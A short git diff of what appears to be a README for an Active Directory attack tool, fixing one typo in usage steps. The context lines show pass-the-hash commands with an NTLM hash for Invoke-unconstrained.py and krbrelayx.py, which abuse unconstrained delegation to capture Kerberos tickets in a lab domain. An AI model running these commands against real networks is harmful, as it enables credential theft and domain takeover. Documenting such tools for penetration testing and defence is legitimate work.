@@ -46,7 +46,7 @@ Step 1:
 ```bash
 Invoke-unconstrained.py -u LABS\DEG$ -p aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc -t DEG$ -ah ATT30.labs.local -aip 192.168.117.134 192.168.117.131
 ```
-Step 2 \(This step get executed automaticly if you are on Linux, you might need to use aesKey if kerberos encrypts ticket with that\): 
+Step 2 \(This step get executed automatically if you are on Linux, you might need to use aesKey if kerberos encrypts ticket with that\): 
 ```bash
 python3 krbrelayx.py -hashes aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc
 [*] Servers started, waiting for connections
